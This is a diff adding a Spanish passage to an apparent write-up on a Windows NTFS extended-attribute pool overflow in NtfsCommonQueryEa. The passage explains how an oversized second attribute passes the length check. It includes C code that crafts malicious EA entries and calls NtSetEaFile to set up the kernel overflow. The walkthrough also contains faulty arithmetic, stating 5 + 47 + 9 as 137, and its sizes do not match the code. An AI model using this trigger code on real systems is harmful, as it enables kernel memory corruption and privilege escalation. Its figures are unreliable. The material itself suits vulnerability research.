@@ -175,5 +175,53 @@ padding = 2
 
 ```
 
+Luego nuestro segundo atributo extendido:
+
+```c
+EaNameLength = 5
+EaValueLength = 47
+
+ea_block_size = 5 + 47 + 9
+ea_block_size = 137
+
+ea_block_size <= out_buf_length - padding
+la verificacion da  137 <= 0 - 2
+
+```
+
+Va a superar la verficacion y se va copiar 137 bytes al final de buffer por lo que va a desbordar el bloque de memoria contiguo.
+
+
+Primero para que ocurra todo esto se asigna el bloque de memoria en el pool paginado que va a desbordarse en la funcion NtfsCommonQueryEa y nosotros tenemos control de el tamaño de este bloque, entonces para triggerear esta vulnerabilidad nesesitamos llamar desde userspace a la funcion NtQueryEaFile que nos va a llevar al codigo vulnerable pero primero nesesitamos llamar a la funcion NtSetEaFile para  construir un archivo de atributos extendidos NTFS y luego pasarselo como argumento a la funcion NtQueryEaFile.
+
+El codigo va  a quedar asi:
+
+```c
+curEa = (PFILE_FULL_EA_INFORMATION)payLoad;
+
+curEa->Flags = 0;
+curEa->EaNameLength = 3;
+curEa->EaValueLength = 162;
+		
+curEa->NextEntryOffset = (curEa->EaNameLength + curEa->EaValueLength + 3 + 9) & (~3);
+memcpy(curEa->EaName, ".PA", 3);
+RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, 162, 0x41);
+
+curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa->NextEntryOffset);
+curEa->NextEntryOffset = 0;
+curEa->Flags = 0;
+ 
+curEa->EaNameLength = 4;
+curEa->EaValueLength = 0xF;
+memcpy(curEa->EaName, ".PBB", 4);
+RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, 0xf, 0);
+
+pd = (PUCHAR)(curEa);
+
+
+NTSTATUS Status = NtSetEaFile(hFile, &eaStatus, payLoad, sizeof(payLoad));
+
+
+```
 
 
